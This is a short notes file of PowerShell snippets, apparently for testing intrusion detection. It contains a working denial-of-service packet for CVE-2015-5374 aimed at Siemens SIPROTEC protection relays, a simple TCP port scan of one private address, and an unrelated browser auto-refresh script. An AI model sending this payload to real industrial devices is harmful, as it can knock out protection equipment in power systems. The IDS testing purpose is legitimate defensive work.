## To test Intrusion Detection/Prevention functionality

**CVE-2015-5374 Siemens SIPROTEC Denial-of-Service Vulnerability**
```powershell
[System.Byte[]] $ByteArray=0x11,0x49,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x28,0x9e
$UdpClient = New-Object System.Net.Sockets.UdpClient
$UdpClient.Connect("192.168.127.56", 50000)
$UdpClient.Send($ByteArray, $ByteArray.length) | out-null
```

**TCP Port SYN Scan**
```powershell
foreach ($p in 1..20) { 
New-Object System.Net.Sockets.TCPClient('192.168.127.56',$p) 
}
```

## To refresh web console page automatically to avoid timeout (Microsoft Edge) 
```powershell
function Page-Refresh {
    While ($true) {
        Start-Sleep -seconds 5
        $edge = Get-Process | Where-Object {$_.MainWindowTitle -like "*edge*"}
        $wshell = New-Object -com WScript.Shell
        $wshell.AppActivate($edge.id)
        $wshell.sendkeys("{F5}")
    }
}

Page-Refresh | Out-Null
```

```bat
powershell -nologo -executionpolicy remotesigned -noexit -noprofile -File "page-refresh.ps1" 
```
